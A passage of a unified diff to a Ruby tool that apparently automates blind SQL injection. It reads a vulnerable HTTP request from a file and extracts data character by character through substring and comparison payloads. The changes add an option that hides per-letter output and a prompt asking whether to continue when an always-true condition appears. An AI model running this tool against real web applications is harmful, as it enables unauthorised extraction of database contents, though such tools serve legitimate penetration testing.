@@ -3,6 +3,7 @@
 require 'uri'
 require 'net/http'
 require 'net/https'
+require 'readline'
 
 # CONFIGURE
 $file = "" # file with vulnerable HTTP request
@@ -25,11 +26,13 @@ $oh = "" # this character is used when opening string when comparing
 $bracket = ")" # substring ending brackets
 $case = "n" # setting case sensitivity
 $hexbracket = "y" # hex delimeter - bracket (y) or space (n)
+$showletter = "y" # if each enumerated letter should be shown
 
 $verbose = "n" # verbose messaging
 $test = "n" # test mode
 timeout = 20 # timeout for receiving responses
 alls = "n" # if all special characters should be included in enumeration
+run = 0 # parameter specifies if program should continue when always true condition is detected
 
 $i = 0 # main counter for characters
 
@@ -52,6 +55,7 @@ ARGV.each do |arg|
 	$test = "y" if arg.include?("--test")
 	$bracket = arg.split("=")[1].to_i - 1 if arg.include?("--bracket=")
 	alls = "y" if arg.include?("--special")
+	$showletter = "n" if arg.include?("--only-final")
 	$hexbracket = "n" if arg.include?("--hexspace")
 	$search = arg.split("=")[1] if arg.include?("--pattern=") && arg.count("=") == 1
 	$prepend = arg.split("=")[1] if arg.include?("--prepend=") && arg.count("=") == 1
@@ -83,13 +87,14 @@ if ARGV.nil? || ARGV.size < 3 || $file == "" || ($search == "" && $test == "n")
 	puts "  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)"
 	puts ""
 	puts "  --test	Enable test mode. Do not send request, just show full payload."
-	puts "  --comma	Encode comma."
-	puts "  --bracket	Add brackets to the end of substring function. --bracket=\"))\""
-	puts "  --hexspace	Use space instead of brackets to split hex values."
 	puts "  --special	Include all special characters in enumeration."
 	puts "  --start	Start enumeration from specified character. (--start=10)"
 	puts "  --max		Maximum characters to enumerate. (--max=10)"
 	puts "  --timeout	Timeout in waiting for responses. (--timeout=20)"
+	puts "  --only-final	Stop showing each enumerated letter."
+	puts "  --comma	Encode comma."
+	puts "  --bracket	Add brackets to the end of substring function. --bracket=\"))\""
+	puts "  --hexspace	Use space instead of brackets to split hex values."
 	puts "  --verbose	Show verbose messages."
 	puts ""
 	puts "Example usage:"
@@ -419,7 +424,7 @@ def cbetween(a, b, c)
 	}
 	if ($response.body.include?($search) || $fheader == "y") && c == "yes"
 		$result = $result + a
-	       	puts "Letter " + $i.to_s + " found: " + a
+	       	puts "Letter " + $i.to_s + " found: " + a if $showletter == "y"
 		$letter = 1
 	end
 end
@@ -444,7 +449,7 @@ def cmoreless(a, b, c)
 	}
 	if ($response.body.include?($search) || $fheader == "y") && c == "yes"
 		$result = $result + b
-	      	puts "Letter " + $i.to_s + " found: " + b
+	      	puts "Letter " + $i.to_s + " found: " + b if $showletter == "y"
 		$letter = 1
 	end
 end
@@ -469,7 +474,7 @@ def clike(a)
 	}
 	if $response.body.include?($search) || $fheader == "y"
 		$result = $result + a
-		puts "Letter " + $i.to_s + " found: " + a
+		puts "Letter " + $i.to_s + " found: " + a if $showletter == "y"
 		$letter = 1
 	end
 end
@@ -494,7 +499,7 @@ def cequal(a)
 	}
 	if $response.body.include?($search) || $fheader == "y"
 		$result = $result + a
-		puts "Letter " + $i.to_s + " found: " + a
+		puts "Letter " + $i.to_s + " found: " + a if $showletter == "y"
 		$letter = 1
 	end
 end
@@ -503,9 +508,14 @@ end
 until $i >= $max  do
 	$i = $i + 1
 	$letter = 0
-	if ($result == "aaaaa")
-        	puts "It seems like your payload gives always true condition. Try another parameter\'s value or different payload.\n";
-        	break
+	if $result == "aaaaa" && run == 0
+        	puts "It seems like your payload gives always true condition. Maybe you should try another parameter\'s value or different payload. Quit (Y/N)?\n";
+		choice = Readline.readline("> ", true)
+        		if choice == "y" || choice == "Y"
+				break
+			else
+				run = 1
+			end
         end
 
 	if $mode == "e"
